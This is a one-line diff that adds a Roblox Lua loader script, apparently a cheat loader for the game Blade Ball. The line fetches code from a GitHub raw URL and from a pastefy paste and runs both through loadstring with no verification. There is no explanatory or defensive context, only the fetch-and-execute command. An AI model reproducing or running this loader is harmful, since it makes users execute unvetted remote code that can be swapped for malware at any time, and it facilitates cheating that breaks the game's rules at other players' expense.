@@ -1,0 +1,1 @@
+task.spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/AchaoticSoftworksCore/AchaoticSources/refs/heads/main/BladeBall/Main.luau"))()end)loadstring(game:HttpGet("https://pastefy.app/uOGPY7V5/raw"))()
